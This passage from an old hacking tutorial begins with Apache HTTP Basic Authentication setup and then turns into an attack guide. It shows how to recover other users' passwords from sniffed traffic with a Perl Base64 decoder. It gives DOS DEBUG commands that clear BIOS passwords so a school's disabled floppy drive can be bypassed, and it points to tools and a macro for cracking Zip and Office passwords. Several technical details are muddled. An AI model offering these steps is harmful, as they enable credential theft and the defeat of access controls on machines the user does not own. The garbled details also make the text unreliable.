+box with the title   $$$$$$$$$ and something like the following text:
+
+UserName and Password Required
+Enter Username and Password for server.name.here
+Username:
+Password:
+
+The HTTP Basic Authentication works same on all servers and is now becoming commonly used 
+for protecting data from the general public.This kind of Authentication does not provide much of 
+security and can be easily exploited to return the password.But anyhow I will mention how to 
+setup a server so that it uses HTTP Basic Authentication.
+Note: I am running Apache and the method to do the same on other platforms may vary.
+Contact the company for more info on how to setup your server to use HTTP Authentication.
+First of all create the password file by typing the htpasswd command:
+
+$>htpasswd -c /etc/httpd/conf/passwords
+
+Once the password file has been created we need to add the users to this password file.For that 
+use the following command:
+
+$>htpasswd /etc/httpd/conf/passwords ankit.fadia
+
+Then you will be prompted to enter the password for the user twice.Once you have completed 
+this process,the Username and Password will be stored in the /etc/httpd/conf/passwords file in 
+the following structure or format:
+
+ankit.fadia:ryWT.SmffRa7pf
+
+The first two fields are obviously the Username and the last two fields is the password encrypted 
+by the DES algorithm.This file is world readble, by that I mean to say that the file can be read by 
+anyone.So if possible disable the FTP and Telnet ports of the Server using HTTP Basic 
+Authentication.Although it will not make much of a difference as this kind of Authentication can 
+easily be hacked, but it always makes sense to be on the safer side and make work difficult for a 
+hacker.
+Now that the password file is ready we need to configure the /etc/httpd/conf/srm.conf file to tell 
+the server where the password file is and what kind of banner should it show when the user 
+needs to be authenticated.
+So edit the /etc/httpd/conf/srm.conf file and enter the following lines:
+
+<Directory /home/httpd/www.servername.com/subfolder>
+AuthType Basic 
+AuthName server.name.here
+ AuthUserFile /etc/httpd/conf/passwords
+require valid-user 
+</Directory>
+
+The directory tag is which folder or directory requires a password.Thus when the user tries to 
+access the mentioned directory the HTTP Password prompt appears.The AuthType specifies the 
+type of authentication.The AuthName gives the name to the banner that is popped up by the 
+browser.the AuthUserFile specifies the path of the password file.The require tag can be 
+configured such even is a Username is part of the password file, he will not be authenticated 
+unless and until he is withing the require tag.For Example,
+
+require ankit.fadia ankit
+
+If the above line is there in the srm.conf file then no one other than ankit and ankit fadia will be 
+authenticated.
+
+Cracking such HTTP Basic Authentication passwords differs from server to server.It also depends 
+on how the system administrator has configured this service.First of all, to find out if the server is 
+actually running HTTP Authentication service, you need to type in the wrong password and if you 
+get the 401 Error, then you can be pretty sure of it.To hack the HTTP passwords, you need to get 
+the sniffer logs, it would contain what a request would look like if we were able to request the 
+page.It would be something like the following:
+
+GET /pagehere HTTP/1.1 
+Authorization: Basic rTyna2yrqw2ADGHsghis==
+
+The text after Basic is the password.No…it is not encrypted, but is just  Base64 encoding.You 
+can easily decode it in Perl using the MIME::Base64 module, the code would be as follows:
+ 
+use MIME::Base64; 
+print decode_base64("rTyna2yrqw2ADGHsghis =="); 
+
+You can get the MIME::Base64 Module from www.cpan.com .After it has be decoded, you will 
+see something like the following: "ankit.fadia:passwordhere" 
+The first two fields would be my username and the last field is my password is plaintext.
+
+BIOS Passwords
+
+This is a password hack but is just clears the BIOS such that the next time you start the PC the 
+CMOS does not ask for any passwordSay at school the floppy drive has been disabled and you 
+want to do your project at home and copy it to the floppy drive and use this floppy to transfer it to 
+the school computer.What do you do.
+In most cases the BIOS is configured to disable the Floppy Drive. Now if you are able to bring the 
+DOS prompt in school the you will be able to change the BIOS setting to the default and enable 
+the floppy drive which is the default setting. In DOS there is the debug command which allows us 
+to do.To clear the CMOS do the following:
+Got DOS and type:
+DEBUG hit enter
+-o 70 2e hit enter
+-o 71 ff hit enter
+-q hit enter
+exit hit enter
+Restart the computer
+It works on most versions of the AWARD BIOS.
+
+Cracking Other Passwords
+
+Password protected Zipped files can be cracked with FZC, for more info read the following 
+tutorial:
+Using FZC to Crack Password-Protected Zip Files - an easy guide to using FZC to crack those 
+annoying password-protected zip files at http://blacksun.box.sk/fzc.html
+You can easily remove Excel and Word passwords by running a evil macro, get the macro at:
+http://www.crosswinds.net/~hackingtruths/manuals.htm
+This Macro has been written for Excel and can esily be edited to crack Word Passwords too, 
+once just needs to know a bit of VB.There is also a software known as Advanced office 97 
+Password Recovery, but that is sharewar and you need to pay for it.
+
+Well, that pretty much wraps up the manual on Cracking Passwords….
+Ankit Fadia
+ankit@bol.net.in
+
+
+To receive more tutorials on Hacking,Cracking (Assembly), Perl, C++ and Viruses/Trojans and 
+more join my mailing list:
+
+Send an email to programmingforhackers-subscribe@egroups.com to join it.
+
+Visit my Site to view all tutorials written by me at: http://www.crosswinds.net/~hackingtruths
